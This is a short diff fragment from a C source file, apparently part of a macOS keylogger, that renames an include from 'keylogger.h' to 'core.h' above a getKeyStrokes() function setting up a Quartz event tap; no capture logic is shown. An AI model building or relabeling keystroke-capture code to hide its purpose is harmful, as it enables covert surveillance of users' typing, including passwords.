@@ -1,4 +1,4 @@
-#include "../include/keylogger.h"
+#include "../include/core.h"
 
 void getKeyStrokes() {
     // Defines a mask that identifies the set of Quartz events to be observed in an event tap.
